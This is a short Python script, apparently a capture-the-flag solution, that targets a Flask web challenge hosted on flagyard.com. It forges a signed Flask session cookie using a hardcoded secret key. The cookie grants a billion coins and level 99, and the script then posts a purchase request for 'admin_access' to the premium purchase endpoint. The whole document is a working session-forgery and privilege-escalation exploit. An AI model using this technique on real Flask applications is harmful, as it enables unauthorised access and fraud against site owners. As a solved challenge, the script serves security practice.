import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

# ---- CONFIG ----
SECRET_KEY = "verysecurekeythatwenevergetto"
TARGET = "http://bmnzdgnsz2l4.playat.flagyard.com"

session_data = {
    "user": "Pwner",
    "coins": 1000000000,
    "level": 99,
    "xp": 999999,
    "inventory": [],
    "used_bonus": False,
    "achievements": [],
    "last_daily_claim": None
}

app = Flask(__name__)
app.secret_key = SECRET_KEY

si = SecureCookieSessionInterface()
signer = si.get_signing_serializer(app)

if signer is None:
    raise RuntimeError("Could not get signing serializer. Check Flask version and SECRET_KEY.")

cookie_value = signer.dumps(session_data)
print("[+] Generated Flask-compatible session cookie:\n")
print(cookie_value)
print("\n[+] Now sending purchase request...")

headers = {
    "Content-Type": "application/json",
    "Cookie": f"session={cookie_value}"
}
payload = {
    "cart": [{"service_id": "admin_access", "quantity": 1}],
    "apply_bonus": False
}

r = requests.post(f"{TARGET}/api/premium/purchase", json=payload, headers=headers, timeout=10)
print("\n[+] Response status:", r.status_code)
print("[+] Response body:")
print(r.text)
